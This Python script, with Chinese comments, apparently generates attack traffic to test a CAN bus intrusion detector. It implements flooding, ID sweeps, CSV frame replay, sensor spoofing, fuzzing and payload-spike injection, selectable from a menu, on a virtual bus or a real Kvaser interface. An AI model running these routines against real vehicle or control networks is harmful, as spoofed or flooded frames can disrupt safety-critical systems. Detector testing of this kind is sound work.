# injector.py
import time
import random
import csv
import can
from config import USE_KVASER, KVASER_CHANNEL, BITRATE


def make_bus():
    if USE_KVASER:
        return can.Bus(interface="kvaser", channel=KVASER_CHANNEL, bitrate=BITRATE)
    return can.Bus(interface="virtual", channel="vcan0", bitrate=BITRATE)


def flood(bus, arb_id=0x100, duration=5.0, hz=200):  # 200Hz flooding
    interval = 1.0 / hz
    end = time.time() + duration
    while time.time() < end:
        bus.send(can.Message(arbitration_id=arb_id, data=[99] * 8, is_extended_id=False))
        time.sleep(interval)


def burst_flood(bus, arb_id=0x100, burst_interval=5.0, burst_duration=1.0, hz=200, rounds=3):
    """每隔 burst_interval 秒进行一次持续 burst_duration 的洪泛，共 rounds 次。"""
    for i in range(rounds):
        time.sleep(burst_interval if i > 0 else 0)
        flood(bus, arb_id=arb_id, duration=burst_duration, hz=hz)


def id_sweep(bus, start_id=0x100, end_id=0x1FF, count_per_id=5, delay=0.01):
    """在 ID 范围内逐个发送，模拟扫描/干扰。"""
    for arb in range(start_id, end_id + 1):
        for _ in range(count_per_id):
            data = [random.randint(0, 255) for _ in range(8)]
            bus.send(can.Message(arbitration_id=arb, data=data, is_extended_id=False))
            time.sleep(delay)


def _parse_arb_id(v):
    v = str(v).strip()
    if v.startswith("0x") or v.startswith("0X"):
        return int(v, 16)
    return int(v)


def _hex_to_bytes(s):
    s = s.strip()
    if not s:
        return b""
    # allow strings like '6363...' or '0x6363...'
    if s.startswith("0x") or s.startswith("0X"):
        s = s[2:]
    if len(s) % 2 == 1:
        s = "0" + s
    return bytes.fromhex(s)


def replay(bus, csv_path, time_col_index=0, arb_col_index=1, data_col_index=2):
    """从 CSV 读取历史帧并按时间间隔重放。CSV 假设第一列为时间戳（秒），第二列为 arb_id，第三列为 data_hex。"""
    with open(csv_path, newline="", encoding="utf-8") as f:
        r = csv.reader(f)
        header = next(r, None)
        prev_ts = None
        for row in r:
            if len(row) <= max(time_col_index, arb_col_index, data_col_index):
                continue
            try:
                ts = float(row[time_col_index])
            except Exception:
                continue
            if prev_ts is None:
                prev_ts = ts
            sleep = ts - prev_ts
            if sleep > 0:
                time.sleep(sleep)
            prev_ts = ts
            try:
                arb = _parse_arb_id(row[arb_col_index])
            except Exception:
                continue
            data = _hex_to_bytes(row[data_col_index])
            # pad/truncate to 8 bytes
            data = (data + b"\x00" * 8)[:8]
            bus.send(can.Message(arbitration_id=arb, data=list(data), is_extended_id=False))


def spoofing(bus, arb_id=0x200, byte_index=0, spoof_value=250, count=20, delay=0.05):
    """发送同 ID 但 payload 带偏差，模拟传感器被篡改。"""
    for _ in range(count):
        data = [0] * 8
        data[byte_index] = spoof_value
        bus.send(can.Message(arbitration_id=arb_id, data=data, is_extended_id=False))
        time.sleep(delay)


def fuzzing(bus, arb_id=0x200, base_payload=None, count=100, mutation_rate=0.2, delay=0.01):
    """对 payload 做轻微随机变异，测试检测器鲁棒性。"""
    if base_payload is None:
        base_payload = [0] * 8
    for _ in range(count):
        data = base_payload.copy()
        for i in range(len(data)):
            if random.random() < mutation_rate:
                data[i] = random.randint(0, 255)
        bus.send(can.Message(arbitration_id=arb_id, data=data, is_extended_id=False))
        time.sleep(delay)


def new_id(bus, arb_id=0x666, count=20):
    for _ in range(count):
        bus.send(can.Message(arbitration_id=arb_id, data=[random.randint(0, 255) for _ in range(8)], is_extended_id=False))
        time.sleep(0.05)


def payload_spike(bus, arb_id=0x200, count=20):
    # 假设 byte0 正常 0~50，异常 spike=250
    for i in range(count):
        data = [250 if i % 3 == 0 else 20, 1, 2, 3, 4, 5, 6, 7]
        bus.send(can.Message(arbitration_id=arb_id, data=data, is_extended_id=False))
        time.sleep(0.05)


def main():
    bus = make_bus()
    print("Choose attack:\n"
          "1) flood\n"
          "2) new_id\n"
          "3) payload_spike\n"
          "4) burst_flood\n"
          "5) id_sweep\n"
          "6) replay (from CSV)\n"
          "7) spoofing\n"
          "8) fuzzing\n")
    c = input(">> ").strip()
    try:
        if c == "1":
            flood(bus)
        elif c == "2":
            new_id(bus)
        elif c == "3":
            payload_spike(bus)
        elif c == "4":
            burst_flood(bus)
        elif c == "5":
            start = input("start_id (hex e.g. 0x100): ").strip() or "0x100"
            end = input("end_id (hex e.g. 0x1FF): ").strip() or "0x1FF"
            id_sweep(bus, start_id=_parse_arb_id(start), end_id=_parse_arb_id(end))
        elif c == "6":
            path = input("csv path: ").strip() or "evidence_log.csv"
            replay(bus, path)
        elif c == "7":
            arb = input("arb_id (hex): ").strip() or "0x200"
            spoofing(bus, arb_id=_parse_arb_id(arb))
        elif c == "8":
            arb = input("arb_id (hex): ").strip() or "0x200"
            fuzzing(bus, arb_id=_parse_arb_id(arb))
        else:
            print("No attack.")
    finally:
        try:
            bus.shutdown()
        except Exception:
            pass


if __name__ == "__main__":
    main()
